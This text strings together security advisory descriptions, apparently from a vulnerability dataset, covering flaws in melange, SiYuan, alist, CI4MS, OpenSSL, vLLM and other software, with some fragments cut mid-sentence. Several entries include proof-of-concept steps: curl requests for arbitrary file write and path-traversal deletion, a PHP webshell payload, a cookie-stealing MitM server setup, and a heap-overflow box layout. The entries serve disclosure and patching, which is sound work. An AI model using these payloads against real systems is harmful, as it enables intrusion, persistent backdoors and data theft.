    "description": "melange allows users to build apk packages using declarative pipelines. From version 0.10.0 to before 0.40.3, an attacker who can influence inputs to the patch pipeline could execute arbitrary shell commands on the build host. The patch pipeline in pkg/build/pipelines/patch.yaml embeds input-derived values (series paths, patch filenames, and numeric parameters) into shell scripts without proper quoting or validation, allowing shell metacharacters to break out of their intended context. The vulnerability affects the built-in patch pipeline which can be invoked through melange build and melange license-check operations. An attacker who can control patch-related inputs (e.g., through pull request-driven CI, build-as-a-service, or by influencing melange configurations) can inject shell metacharacters such as backticks, command substitutions $(\u2026), semicolons, pipes, or redirections to execute arbitrary commands with the privileges of the melange build process. This issue has been patched in version 0.40.3.",

    "description": "OpenClaw is a personal AI assistant. Prior to version 2026.1.29, there is an OS command injection vulnerability via the Project Root Path in sshNodeCommand. The sshNodeCommand function constructed a shell script without properly escaping the user-supplied project path in an error message. When the cd command failed, the unescaped path was interpolated directly into an echo statement, allowing arbitrary command execution on the remote SSH host. The parseSSHTarget function did not validate that SSH target strings could not begin with a dash. An attacker-supplied target like -oProxyCommand=... would be interpreted as an SSH configuration flag rather than a hostname, allowing arbitrary command execution on the local machine. This issue has been patched in version 2026.1.29.",

Successful exploitation may lead to full compromise of the affected instance, including unauthorized access to sensitive data, modification of workflows, and execution of system-level operations.\n\n### Patches\nThis issue has been fixed in n8n v1.122.0.\n\nUsers are strongly advised to upgrade to version 1.122.0 or later, which introduces additional safeguards to restrict expression evaluation.\n\n### Workarounds\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n\n- Limit workflow creation and editing permissions to fully trusted users only.\n- Deploy n8n in a hardened environment with restricted operating system privileges and network access to reduce the impact of potential exploitation.\n\nThese workarounds do not fully eliminate the risk and should only be used as short-term measures.",

Prior to autogpt-platform-beta-v0.6.46, the AutoGPT platform's Stagehand integration blocks log API keys and authentication secrets in plaintext using logger.info() statements. This occurs in three separate block implementations (StagehandObserveBlock, StagehandActBlock, and StagehandExtractBlock) where the code explicitly calls api_key.get_secret_value() and logs the result. This issue has been patched in autogpt-platform-beta-v0.6.46.",

This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.\nVulnerability was patched in version 2.2.1 for unauthenticated users, and fully patched in version 2.2.3 for Administrator+ level users.",

    "description": "### Impact \nA Command Injection vulnerability in godot-mcp allows remote code execution. The `executeOperation` function passed user-controlled input (e.g., `projectPath`) directly to `exec()`, which spawns a shell. An attacker could inject shell metacharacters like `$(command)` or `&calc` to execute arbitrary commands with the privileges of the MCP server process. \n\nThis affects any tool that accepts `projectPath`, including `create_scene`, `add_node`, `load_sprite`, and others. \n\n### Patches \nFixed in version 0.1.1 by switching from `exec()` to `execFile()`, which does not invoke a shell. \n\n### Workarounds \nNone. Users should upgrade immediately. \n\n### Resources\n - https://github.com/Coding-Solo/godot-mcp/issues/64\n - https://github.com/Coding-Solo/godot-mcp/pull/67",

    "description": "## Summary\n\nThe `/api/file/copyFile` endpoint does not validate the `dest` parameter, allowing authenticated users to write files to arbitrary locations on the filesystem. This can lead to Remote Code Execution (RCE) by writing to sensitive locations such as cron jobs, SSH authorized_keys, or shell configuration files.\n\n- Affected Version: 3.5.3 (and likely all prior versions)\n\n## Details\n\n- Type: Improper Limitation of a Pathname to a Restricted Directory (CWE-22)\n- Location: `kernel/api/file.go` - copyFile function\n\n```go\n// kernel/api/file.go lines 94-139\nfunc copyFile(c *gin.Context) {\n    // ...\n    src := arg[\"src\"].(string)\n    src, err := model.GetAssetAbsPath(src)  // src is validated\n    // ...\n\n    dest := arg[\"dest\"].(string)  // dest is NOT validated!\n    if err = filelock.Copy(src, dest); err != nil {\n        // ...\n    }\n}\n```\n\nThe `src` parameter is properly validated via `model.GetAssetAbsPath()`, but the `dest` parameter accepts any absolute path without validation, allowing files to be written outside the workspace directory.\n\n## PoC\n\n### Step 1: Upload malicious content to workspace\n\n```bash\ncurl -X POST \"http://target:6806/api/file/putFile\" \\\n  -H \"Authorization: Token <API_TOKEN>\" \\\n  -F \"path=/data/assets/malicious.sh\" \\\n  -F \"file=@-;filename=malicious.sh\" <<< '#!/bin/sh\nid > /tmp/pwned.txt\nhostname >> /tmp/pwned.txt'\n```\n\n### Step 2: Copy to arbitrary location (e.g., /tmp)\n\n```bash\ncurl -X POST \"http://target:6806/api/file/copyFile\" \\\n  -H \"Authorization: Token <API_TOKEN>\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"src\": \"assets/malicious.sh\", \"dest\": \"/tmp/malicious.sh\"}'\n```\n\nResponse: `{\"code\":0,\"msg\":\"\",\"data\":null}`\n\n### Step 3: Verify file was written outside workspace\n\n```bash\ncat /tmp/malicious.sh\n# Output: #!/bin/sh\n#         id > /tmp/pwned.txt\n#         hostname >> /tmp/pwned.txt\n```\n\n## Attack Scenarios\n\n| Target Path | Impact |\n|-------------|--------|\n| `/etc/cron.d/backdoor` | Scheduled command execution (RCE) |\n| `~/.ssh/authorized_keys` | Persistent SSH access |\n| `~/.bashrc` | Command execution on user login |\n| `/etc/ld.so.preload` | Shared library injection |\n\n### RCE Demonstration\n\n RCE was successfully demonstrated by writing a script and executing it:\n\n```bash\n# Write script to /tmp\ncurl -X POST \"http://target:6806/api/file/copyFile\" \\\n  -H \"Authorization: Token <API_TOKEN>\" \\\n  -d '{\"src\": \"assets/malicious.sh\", \"dest\": \"/tmp/malicious.sh\"}'\n\n# Execute (simulating cron or login trigger)\nsh /tmp/malicious.sh\n\n# Result\ncat /tmp/pwned.txt\n# uid=0(root) gid=0(root) groups=0(root)...\n```\n\n## Impact\n\nAn authenticated attacker (with API Token) can:\n1. Achieve Remote Code Execution with the privileges of the SiYuan process\n2. Establish persistent backdoor access via SSH keys\n3. Compromise the entire host system\n4. Access sensitive data on the same network (lateral movement)\n\n## Suggested Fix\n\nAdd path validation to ensure `dest` is within the workspace directory:\n\n```go\nfunc copyFile(c *gin.Context) {\n    // ...\n    dest := arg[\"dest\"].(string)\n\n    // Add validation\n    if !util.IsSubPath(util.WorkspaceDir, dest) {\n        ret.Code = -1\n        ret.Msg = \"dest path must be within workspace\"\n        return\n    }\n\n    if err = filelock.Copy(src, dest); err != nil {\n        // ...\n    }\n}\n```\n\n## Solution\n\nd7f790755edf8c78d2b4176171e5a0cdcd720feb",

    "description": "# Arbitrary File Write via Symlink Extraction in `github.com/node-modules/compressing`\n\n## Brief Introduction\n\nThe `compressing` npm package extracts TAR archives while restoring symbolic links without validating their targets. \nBy embedding symlinks that resolve outside the intended extraction directory, an attacker can cause subsequent file entries to be written to arbitrary locations on the host file system.\n\nDepending on the extractor\u2019s handling of existing files, this behavior may allow overwriting sensitive files or creating new files in security-critical locations.\n\n## Affected Component and Versions\n\n- **Component**: `github.com/node-modules/compressing`\n- **Affected Versions**: `<= 1.10.3 || =2.0.0` \n\n## Vulnerability Details\n\n### Root Cause\n\n`compressing.tar.uncompress` sanitizes the destination paths of archive entries, but it does **not** restrict or validate the targets of symlinks contained in TAR archives. During extraction, the library creates those symlinks inside the output directory. Later entries that resolve through the symlink are written to the symlink target rather than the intended extraction root, enabling an arbitrary file write.\n\n### Impact\n\nAn attacker who can supply a crafted TAR archive can:\n\n- Cause files to be written outside the intended extraction directory (arbitrary file write via symlink traversal).\n\n- Write files to attacker-controlled paths on the host file system once symbolic links are followed during extraction.\n\n- In environments where extraction is performed with elevated privileges or targets executable paths, this may lead to code execution, privilege escalation, data corruption, or denial of service.\n\n## Reproduction\n\n### Environment\n\n- **OS**: Ubuntu 24.04\n- **Node.js**: v24.12.0\n- **compressing**: 2.0.0\n\n### Construct PoC Archive\n\nThe following pseudo-code demonstrates the attack logic:\n\n```python\nbase_dir = \"archive/\"\nwith tarfile.open(\"./poc_arbitrary_write.tar\", mode=\"w\") as tar:\n    add_regular_file(tar, base_dir + \"baseFile.txt\", \"base content\\n\")\n    add_symlink(tar, base_dir + \"myTmp\", \"/tmp\")\n    add_regular_file(tar, base_dir + \"myTmp/poc.txt\", \"Arbitrary File Write\\n\")\n```\n\n### Extract the Archive\n\n```javascript\nconst compressing = require('compressing');\n\nfunction untar(archiveName, destPath) {\n  return compressing.tar.uncompress(archiveName, destPath);\n}\n\n\nasync function main() {\n  const archivePath = process.argv[2];\n  const destPath = \"./output\";\n\n  if (archivePath && archivePath.endsWith(\".tar\")) {\n    await untar(archivePath, destPath);\n  }\n}\n\nmain();\n```\n\n### Attack Results\n\n<img width=\"547\" height=\"161\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5ea12efd-0d3f-4f8a-8414-b3a5c72e153e\" />\n\n\nAfter extraction, the output directory contains a symlink pointing to `/tmp`. The file `poc.txt` is then written through the symlink to `/tmp/poc.txt`, demonstrating an arbitrary file write outside the extraction directory.\n\n## Summary\n\n`compressing` restores symlinks from TAR archives without validating their targets. By combining a malicious symlink with a subsequent file entry, an attacker can redirect extracted files to arbitrary locations on the host.",

    "description": "### Summary\nThe application disables TLS certificate verification by default for all outgoing storage driver communications, making the system vulnerable to Man-in-the-Middle (MitM) attacks. This enables the complete decryption, theft, and manipulation of all data transmitted during storage operations, severely compromising the confidentiality and integrity of user data.\n\n### Details\nCertificate verification is disabled by default for all storage driver communications.\n\nThe `TlsInsecureSkipVerify` setting is default to true in the `DefaultConfig()` function in [internal/conf/config.go](https://github.com/AlistGo/alist/blob/b4d9beb49cba399842a54fcc33bc95a4a09b7bd4/internal/conf/config.go#L159).\n\n~~~go\nfunc DefaultConfig() *Config {\n    // ...\n    TlsInsecureSkipVerify: true,\n    // ...\n}\n~~~\n\nThis vulnerability enables Man-in-the-Middle (MitM) attacks by disabling TLS certificate verification, allowing attackers to intercept and manipulate all storage communications. Attackers can exploit this through network-level attacks like ARP spoofing, rogue Wi-Fi access points, or compromised internal network equipment to redirect traffic to malicious endpoints. Since certificate validation is skipped, the system will unknowingly establish encrypted connections with attacker-controlled servers, enabling full decryption, data theft, and manipulation of all storage operations without triggering any security warnings. \n\n\n\n#### PoC\nThe /etc/hosts file was modified to simulate DNS hijacking and redirect www.weiyun.com to a malicious TLS-enabled HTTP server.\n\nThe purpose of this Proof of Concept is to demonstrate that the Alist server will establish communication with a malicious server due to disabled certificate verification. This allows interception and theft of authentication cookies used for communicating with other storage providers.\n\n[Video](https://github.com/user-attachments/assets/5b042db0-d830-41d9-9cec-d2ba677ac53d)\n\n\n\n##### Setup a malicious https server:\n\nssl.conf:\n~~~\nLoadModule ssl_module modules/mod_ssl.so\nLoadModule log_config_module modules/mod_log_config.so\n\nListen 443\n\nLogFormat \"%h %l %u %t \\\"%r\\\" %>s %b Host:%{Host}i User-Agent:%{User-Agent}i Referer:%{Referer}i Accept:%{Accept}i Cookie:%{Cookie}i\" headers\nCustomLog \"/usr/local/apache2/logs/headers.log\" headers\n\n<VirtualHost _default_:443>\n    DocumentRoot \"/usr/local/apache2/htdocs\"\n    ServerName localhost\n\n    SSLEngine on\n    SSLCertificateFile \"/usr/local/apache2/conf/server.crt\"\n    SSLCertificateKeyFile \"/usr/local/apache2/conf/server.key\"\n\n    ErrorLog \"/usr/local/apache2/logs/ssl_error.log\"\n\n    <Directory \"/usr/local/apache2/htdocs\">\n        Options Indexes FollowSymLinks\n        AllowOverride None\n        Require all granted\n    </Directory>\n</VirtualHost>\n~~~\n\nDockerfile:\n~~~\nFROM httpd:2.4\n\n# Copy SSL config\nCOPY ssl.conf /usr/local/apache2/conf/extra/ssl.conf\n\n# Include SSL config in main httpd.conf\nRUN echo \"Include conf/extra/ssl.conf\" >> /usr/local/apache2/conf/httpd.conf\n\n# Copy certs\nCOPY certs/server.crt /usr/local/apache2/conf/server.crt\nCOPY certs/server.key /usr/local/apache2/conf/server.key\n~~~\n\nScripts to run https server:\n\n~~~bash\nmkdir certs\nopenssl req -x509 -nodes -days 365 \\\n  -newkey rsa:2048 \\\n  -keyout certs/server.key \\\n  -out certs/server.crt\ndocker build -t httpd-ssl .\ndocker run -dit --name my-https-server httpd-ssl\n~~~\n\n##### Run alist\n~~~bash\ndocker run -d --restart=unless-stopped -v /etc/alist:/opt/alist/data -p 5244:5244 -e PUID=0 -e PGID=0 -e UMASK=022 --name=\"alist\" alist666/alist:latest\n~~~\n\nSimulate DNS hijacking: Modify container's /etc/hosts to redirect www.weiyun.com to malicious server\n~~~\n<IP of HTTPS Server>      www.weiyun.com\n~~~\n\nIn the front end, add a weiyun storage and inspect log on tls server:\n~~~\nroot@f6d0f5bebe60:/usr/local/apache2# cat /usr/local/apache2/logs/headers.log\n172.17.0.3 - - [30/Oct/2025:03:52:58 +0000] \"GET /disk HTTP/1.1\" 404 196 Host:www.weiyun.com User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Referer:- Accept:- Cookie:WhatEverSecret=\n~~~\n\nNote that the cookie is in the log.\n\n### Impact\nThis misconfiguration allows attackers to perform man in the middle attack, which potentially leads to the complete decryption, theft, and manipulation of all data transmitted during storage operations, severely compromising the confidentiality and integrity of user data.\n\nThis vulnerability affects all alist deployment.\n\n### Credit\nThis vulnerability was discovered by:\n- XlabAI Team of Tencent Xuanwu Lab\n- Atuin Automated Vulnerability Discovery Engine\n\nIf there are any questions regarding the vulnerability details, please feel free to reach out for further discussion at xlabai@tencent.com.",

    "description": "### Impact\n\nThe default configuration of `startStandaloneServer` from `@apollo/server/standalone` is vulnerable to Denial of Service (DoS) attacks through specially crafted request bodies with exotic character set encodings.\n\nThis issue does not affect users that use `@apollo/server` as a dependency for integration packages, like `@as integrations/express5` or `@as-integrations/next`, only direct usage of `startStandaloneServer`.\n\n### Who is impacted\n\nUsers directly using `startStandaloneServer` from `@apollo/server/standalone`.\n\nThis issue affects Apollo Server from v5.0.0 through v5.3.x.\n\nIt also affects all releases of the end-of-life major versions v4, v3, and v2.  Although Apollo Server v4 is EOL and Apollo no longer commits to providing support or updates for it, a fix for it was released in v4.13.0.  Apollo Server v3 and v2 are no longer updated, as they have been EOL since 2024 and 2023 respectively.\n\n### Patches\n\nPatches for this issue are released as `@apollo/server` versions `5.4.0` and `4.13.0`.\n\nIn accordance with [RFC 7159](https://datatracker.ietf.org/doc/html/rfc7159#section-8.1), these versions now only accept request bodies encoded in UTF-8, UTF-16 (LE or BE), or UTF-32 (LE or BE). Any other character set will be rejected with a `415 Unsupported Media Type` error. Note that the more recent JSON RFC, [RFC 8259 (https://datatracker.ietf.org/doc/html/rfc8259#section-8.1), is more strict and will only allow UTF-8. Since this is a minor release, we have chosen to remain compatible with the more permissive RFC 7159 for now. In a future major release, the restriction may be tightened further to only allow UTF-8.\n\n### Workarounds\n\nUsers of `apollo-server` v2 or v3 that cannot upgrade for some reason could switch from the standalone `apollo-server`\npackage to an integration package like `apollo-server-express` or `apollo-server-koa` and set up their own server. Please note that these old packages are generally EOL and do not receive any more support or bug fixes. This can only be seen as a short-term workaround. Updating to `@apollo/server` v5 should be a priority.",

    "description": "### Summary\nThe application contains a Path Traversal vulnerability (CWE-22) in multiple file operation handlers. An authenticated attacker can bypass directory-level authorisation by injecting traversal sequences into filename components, enabling unauthorised file removal, movement and copying across user boundaries within the same storage mount.\n\n### Details\nThe application contains a Path Traversal vulnerability (CWE-22) in multiple file operation handlers ([server/handles/fsmanage.go](https://github.com/AlistGo/alist/blob/main/server/handles/fsmanage.go), [server/handles/fsbatch.go](https://github.com/AlistGo/alist/blob/main/server/handles/fsbatch.go), etc.). Filename components in `req.Names`, `renameObject.SrcName`, and `renameObject.NewName` are directly concatenated with validated directories using `stdpath.Join()` or `fmt.Sprintf()`. This allows \"..\" sequences to bypass path restrictions, enabling users to access other users' files within the same storage mount and perform unauthorized actions such as deletion, renaming, or copying of files.\n\n[FsRemove](https://github.com/AlistGo/alist/blob/b4d9beb49cba399842a54fcc33bc95a4a09b7bd4/server/handles/fsmanage.go#L253-L254):\n~~~go\nfunc FsRemove(c *gin.Context) {\n\t// ...\n\tfor _, name := range req.Names {\n\t\terr := fs.Remove(c, stdpath.Join(reqDir, name))\n~~~\n\n[FsCopy](https://github.com/AlistGo/alist/blob/b4d9beb49cba399842a54fcc33bc95a4a09b7bd4/server/handles/fsmanage.go#L165-L166):\n~~~go\nfunc FsCopy(c *gin.Context) {\n\t// ...\n\tfor i, name := range req.Names {\n\t\tt, err := fs.Copy(c, stdpath.Join(srcDir, name), dstDir, len(req.Names) > i+1)\n~~~\n\n[FsBatchRename](https://github.com/AlistGo/alist/blob/b4d9beb49cba399842a54fcc33bc95a4a09b7bd4/server/handles/fsbatch.go#L188-L189):\n~~~go\nfunc FsBatchRename(c *gin.Context) {\n    // ...\n    for _, renameObject := range req.RenameObjects {\n        filePath := fmt.Sprintf(\"%s/%s\", reqPath, renameObject.SrcName)  // Vulnerable concatenation \u2717\n        fs.Rename(c, filePath, renameObject.NewName)\n    }\n}\n~~~\n\n\n#### PoC\n1. Environment setup:\n- Storage mount '/shared' configured with multiple users.\n- Alice has base path '/shared/alice'.\n- Admin has base path '/shared/admin' with private files.\n- Both users operate within the same storage mount.\n\n2. Craft Malicious Request:\nAlice sends a POST request to _/api/fs/remove_ containing a filename with '../' in it.\n~~~bash\ncurl -X POST -H  \"Content-Type: application/json\" -d '{\"dir\":\"/\",\"names\":[\"../admin/private.txt\"]}' http://localhost:5244/api/fs/remove\n~~~\n\nAdmin's file is deleted without Alice having authorisation for Admin's directory.\n\n[Video](https://github.com/user-attachments/assets/5789fa36-c82c-4781-a5f7-145f54689ada)\n\n\n### Impact\nThis vulnerability enables privilege escalation within shared storage environments. An authenticated attacker with basic file operation permissions (remove/rename/copy/move) can bypass directory-level authorisation controls when multiple users exist within the same storage mount.\n\n#### Attack Requirements:\n1. Authenticated user account (not guest)\n2. Basic file operation permissions\n3. Multi-user environment within the same storage mount\n\n#### Consequences:\n1. Unauthorised data access: Read, copy, and exfiltrate files from other users' directories\n2. Data destruction: Delete or rename files belonging to other users\n3. Access control bypass: Circumvent directory isolation mechanisms\n4. Integrity violation: Modify or move files across user boundaries\n\n\n### Credit\nThis vulnerability was discovered by:\n- XlabAI Team of Tencent Xuanwu Lab\n- Atuin Automated Vulnerability Discovery Engine\n\nIf there are questions regarding the vulnerability details, please feel free to reach out for further discussion at xlabai@tencent.com.",

An attacker who can supply a malicious APK package (e.g., via a compromised or typosquatted repository) could create directories or symlinks outside the intended installation root. The MkdirAll, Mkdir, and Symlink methods in pkg/apk/fs/rwosfs.go use filepath.Join() without validating that the resulting path stays within the base directory.\n\n**Fix:** Fixed by [d8b7887](https://github.com/chainguard-dev/apko/commit/d8b7887a968a527791b3c591ae83928cb49a9f14).

    "description": "A Path Traversal vulnerability in the `partition_msg` function allows an attacker to write or overwrite arbitrary files on the filesystem when processing malicious MSG files with attachments.\n\n  ## Impact\n  An attacker can craft a malicious .msg file with attachment filenames containing path traversal sequences (e.g.,\n  `../../../etc/cron.d/malicious`). When processed with `process_attachments=True`, the library writes the attachment to an\n  attacker-controlled path, potentially leading to:\n\n  - Arbitrary file overwrite\n  - Remote code execution (via overwriting configuration files, cron jobs, or Python packages)\n  - Data corruption\n  - Denial of service\n\n  ## Affected Functionality\n  The vulnerability affects the MSG file partitioning functionality when `process_attachments=True` is enabled.\n\n  ## Vulnerability Details\n  The library does not sanitize attachment filenames in MSG files before using them in file write operations, allowing directory\n  traversal sequences to escape the intended output directory.\n\n  ## Workarounds\n  Until patched, users can:\n  - Set `process_attachments=False` when processing untrusted MSG files\n  - Avoid processing MSG files from untrusted sources\n  - Implement additional filename validation before processing",

    "description": "### Impact\n\nThe use of `Buffer.allocUnsafe()` and `Buffer.allocUnsafeSlow()` in the task runner allowed untrusted code to allocate uninitialized memory. Such uninitialized buffers could contain residual data from within the same Node.js process (for example, data from prior requests, tasks, secrets, or tokens), resulting in potential information disclosure.  \n\nOnly authenticated users are able to execute code through Task Runners.\n\nThis issue affected any deployment in which both of the following conditions were met:\n- Task Runners were enabled using `N8N_RUNNERS_ENABLED=true` (default: false)\n- Code Node was enabled (default: true)\n\n\n### Patches\n\nAccess to unsafe Buffer functions has been removed from the task runner sandbox. All buffer allocations are now zero-filled by default.\n\n- **Fixed in:** 1.114.3 & 1.115.0\n- **Action:** It is strongly recommended to upgrade to version \u2265 1.114.3 as soon as possible.\n\nChanges introduced in this patch include:\n- Routing all buffer allocations through `Buffer.alloc` (which zero-fills) operations where applicable  \n- Adding regression tests to ensure continued enforcement of safe allocation practices\n\n\n### Workarounds\n\nIf an immediate upgrade cannot be applied, the following hardening steps are recommended:\n\n- Disable the Code Node by adding `n8n-nodes-base.code` to the `NODES_EXCLUDE` environment variable  \n- Prefer external mode for isolation: run Task Runners in external mode so that untrusted task code executes in a separate sidecar container rather than within the main n8n process. This configuration significantly reduces the risk of in-process memory disclosure caused by unsafe buffer allocations.  \n  In external mode, a launcher manages Task Runner processes in a dedicated sidecar environment, separate from the primary n8n instance.  \n  See the [n8n documentation](https://docs.n8n.io/hosting/configuration/task-runners/) for configuration details and required environment variables.\n\n\n### Resources\n\n- Node.js documentation: [`Buffer.alloc()`](https://nodejs.org/docs/latest-v22.x/api/buffer.html#static-method-bufferallocsize-fill-encoding) vs [`Buffer.allocUnsafe()`](https://nodejs.org/docs/latest-v22.x/api/buffer.html#static-method-bufferallocunsafesize) \u2014 background on zero-filled vs uninitialized allocations  \n- [n8n Documentation \u2014 Task Runners](https://docs.n8n.io/hosting/configuration/task-runners/) \u2014 external mode, setup guide, and environment configuration details\n- [n8n Documentation \u2014 Blocking nodes](https://docs.n8n.io/hosting/securing/blocking-nodes/) \u2014 how to globally disable specific nodes",

A bug in the path comparison logic makes curl read outside a heap buffer\n   boundary\n\nThe bug either causes a crash or it potentially makes the comparison come to\nthe wrong conclusion and lets the clear-text site override the contents of the\nsecure cookie, contrary to expectations and depending on the memory contents\nimmediately following the single-byte allocation that holds the path.\n\nThe presumed and correct behavior would be to plainly ignore the second set of\nthe cookie since it was already set as secure on a secure host so overriding\nit on an insecure host should not be okay.",

Prior to version 1.19.0, a prototype pollution vulnerability exists in the formToObj() function within @builder.io/qwik-city middleware. The function processes form field names with dot notation (e.g., user.name) to create nested objects, but fails to sanitize dangerous property names like __proto__, constructor, and prototype. This allows unauthenticated attackers to pollute Object.prototype by sending crafted HTTP POST requests, potentially leading to privilege escalation, authentication bypass, or denial of service.

    "description": "**Summary**\n\nA critical vulnerability has been identified in CI4MS that allows an authenticated user with file editor permissions to achieve Remote Code Execution (RCE). By leveraging the file creation and save endpoints, an attacker can upload and execute arbitrary PHP code on the server.\n\n**Vulnerability Details**\n\nThe vulnerability exists in the /backend/fileeditor/createFile and /backend/fileeditor/save API endpoints.\n\nUnrestricted File Creation: The createFile endpoint allows users to create files with any extension (including .php) in web-accessible directories such as /public.\n\nArbitrary Content Injection: The save endpoint allows users to write arbitrary content into the created files without sufficient server-side validation or sanitization.\n\nAn attacker can combine these two flaws to create a PHP webshell and execute system-level commands, leading to a complete compromise of the web server.\n\n**Impact**\n\nSuccessful exploitation allows:\n\nFull access to the server's file system and databases.\n\nExecution of arbitrary OS commands.\n\nPermanent modification or deletion of application data.\n\nSteps to Reproduce\n\nLog in to an account with permissions to use the file editor.\n\nCreate a new PHP file in a public directory using the following request:\n\n```\ncurl -X POST '[SERVER_URL]/backend/fileeditor/createFile' -d 'path=/public' -d 'name=exploit.php'\n```\n\nInject a PHP payload into the file using the save endpoint:\n\n```\ncurl -X POST '[SERVER_URL]/backend/fileeditor/save' -H 'Content-Type: application/json' -d '{\"path\":\"/public/exploit.php\",\"content\":\"<?php echo shell_exec($_GET[\\\"cmd\\\"]); ?>\"}'\n```\n\nAccess the file via the browser to execute commands: https://[SERVER_URL]/exploit.php?cmd=whoami\n\nSuggested Mitigation\n\nPath Validation: Restrict file operations to non-executable directories.\n\nExtension Whitelisting: Strictly allow only safe file extensions (e.g., .css, .js, .txt) and block executable extensions like .php, .phtml, etc.\n\nContent Sanitization: Implement server-side checks to prevent the injection of malicious code patterns.\n\nExecution Prevention: Disable PHP execution in public/upload directories via server configuration (e.g., .htaccess or Nginx config).",

    "description": "### Impact\n\nA validation bypass vulnerability exists in Fastify where request body validation schemas specified by Content-Type can be completely circumvented. By appending a tab character (`\\t`) followed by arbitrary content to the Content-Type header, attackers can bypass body validation while the server still processes the body as the original content type.\n\nFor example, a request with `Content-Type: application/json\\ta` will bypass JSON schema validation but still be parsed as JSON.\n\nThis vulnerability affects all Fastify users who rely on Content-Type-based body validation schemas to enforce data integrity or security constraints. The concrete impact depends on the handler implementation and the level of trust placed in the validated request body, but at the library level, this allows complete bypass of body validation for any handler using Content-Type-discriminated schemas.\n\nThis issue is a regression or missed edge case from the fix for a previously reported vulnerability.\n\n### Patches\n\nThis vulnerability has been patched in **Fastify v5.7.2**. All users should upgrade to this version or later immediately.\n\n### Workarounds\n\nIf upgrading is not immediately possible, user can implement a custom `onRequest` hook to reject requests containing tab characters in the Content-Type header:\n\n```javascript\nfastify.addHook('onRequest', async (request, reply) => {\n  const contentType = request.headers['content-type']\n  if (contentType && contentType.includes('\\t')) {\n    reply.code(400).send({ error: 'Invalid Content-Type header' })\n  }\n})\n```\n\n### Resources\n\n- https://github.com/fastify/fastify/blob/759e9787b5669abf953068e42a17bffba7521348/lib/validation.js#L272\n- https://github.com/fastify/fastify/blob/759e9787b5669abf953068e42a17bffba7521348/lib/content-type-parser.js#L125\n- [Fastify Validation and Serialization Documentation](https://fastify.dev/docs/latest/Reference/Validation-and-Serialization/)\n- https://hackerone.com/reports/3464114",

    "description": "## Summary\n\nThe Control UI trusts `gatewayUrl` from the query string without validation and auto-connects on load, sending the stored gateway token in the WebSocket connect payload.\n\nClicking a crafted link or visiting a malicious site can send the token to an attacker-controlled server. The attacker can then connect to the victim's local gateway, modify config (sandbox, tool policies), and invoke privileged actions, achieving 1-click RCE. This vulnerability is exploitable even on instances configured to listen on loopback only, since the victim's browser initiates the outbound connection.\n\n## Details\n\nThe root cause is the lack of validation for `gatewayUrl` combined with auto\u2011connect behavior on page load. With the change users now need to confirm the new gateway URL in the UI.\n\n## Impact\n\nThis is a token exfiltration vulnerability that leads to full gateway compromise. It impacts any Moltbot deployment where a user has authenticated to the Control UI. The attacker gains operator-level access to the gateway API, enabling arbitrary config changes and code execution on the gateway host. The attack works even when the gateway binds to loopback because the victim's browser acts as the bridge.",

Triggering this issue requires an administrator to specifically configure ingress-nginx with a broken external component.",

    "description": "Issue summary: Parsing CMS AuthEnvelopedData message with maliciously\ncrafted AEAD parameters can trigger a stack buffer overflow.\n\nImpact summary: A stack buffer overflow may lead to a crash, causing Denial\nof Service, or potentially remote code execution.\n\nWhen parsing CMS AuthEnvelopedData structures that use AEAD ciphers such as\nAES-GCM, the IV (Initialization Vector) encoded in the ASN.1 parameters is\ncopied into a fixed-size stack buffer without verifying that its length fits\nthe destination. An attacker can supply a crafted CMS message with an\noversized IV, causing a stack-based out-of-bounds write before any\nauthentication or tag verification occurs.\n\nApplications and services that parse untrusted CMS or PKCS#7 content using\nAEAD ciphers (e.g., S/MIME AuthEnvelopedData with AES-GCM) are vulnerable.\nBecause the overflow occurs prior to authentication, no valid key material\nis required to trigger it. While exploitability to remote code execution\ndepends on platform and toolchain mitigations, the stack-based write\nprimitive represents a severe risk.\n\nThe FIPS modules in 3.6, 3.5, 3.4, 3.3 and 3.0 are not affected by this\nissue, as the CMS implementation is outside the OpenSSL FIPS module\nboundary.\n\nOpenSSL 3.6, 3.5, 3.4, 3.3 and 3.0 are vulnerable to this issue.\n\nOpenSSL 1.1.1 and 1.0.2 are not affected by this issue.",

Leak allows for simple ASLR bypass. Leak + heap overflow achieves RCE on versions prior to 0.14.1. \n\nDeployments not serving a video model are not affected.\n\n---\n\n\n## 1. Vulnerability Overview\n\n### 1.1 The Bug: JPEG2000 cdef Box Heap Overflow\nThe JPEG2000 decoder used by OpenCV (cv2) honors a `cdef` box that can remap color channels. When Y (luma) is mapped into the U (chroma) plane buffer, the decoder writes a large Y plane into the smaller U buffer, causing a heap overflow.\n\n**Root Cause**\n- `cdef` allows channel remapping (e.g., Y\u2192U, U\u2192Y).\n- Y plane size: `W\u00d7H`; U plane size: `(W/2)\u00d7(H/2)`.\n- Overflow size = `W\u00d7H - (W/2\u00d7H/2)` = `0.75 \u00d7 W \u00d7 H` bytes.\n\n**Example (150\u00d764)**\n- Y plane: 150\u00d764 = 9,600 bytes  \n- U plane: 75\u00d732 = 2,400 bytes  \n- Overflow: 7,200 bytes past the U buffer\n\n### 1.2 Malicious cdef Box\n```\nOffset  Size  Field           Value\n0       4     Box Length      0x00000016 (22 bytes)\n4       4     Box Type        'cdef'\n8       2     N (channels)    0x0003\n10      2     Channel 0 Cn    0x0000 (Y channel)\n12      2     Channel 0 Typ   0x0000 (color)\n14      2     Channel 0 Asoc  0x0002 (\u2192 maps Y into U plane)\n16      2     Channel 1 Cn    0x0001 (U channel)\n18      2     Channel 1 Typ   0x0000 (color)\n20      2     Channel 1 Asoc  0x0001 (\u2192 maps U into Y plane)\n22      2     Channel 2 Cn    0x0002 (V channel)\n24      2     Channel 2 Typ   0x0000 (color)\n26      2     Channel 2 Asoc  0x0003 (\u2192 maps V plane)\n```\nKey control: `Asoc=2` for channel 0 forces Y data into the U buffer, triggering the overflow.\n\n---\n\n## Vulnerable Code Chain\n\n### 1) Entry: vLLM accepts a remote `video_url` and downloads raw bytes\n\nvLLM\u2019s OpenAI-compatible API supports a `video_url` content part:\n\n```python\nclass VideoURL(TypedDict, total=False):\n    url: Required[str]\n\nclass ChatCompletionContentPartVideoParam(TypedDict, total=False):\n    video_url: Required[VideoURL]\n    type: Required[Literal[\"video_url\"]]\n```\n\nSource: `src/vllm/entrypoints/chat_utils.py`.\n\nWhen the URL is 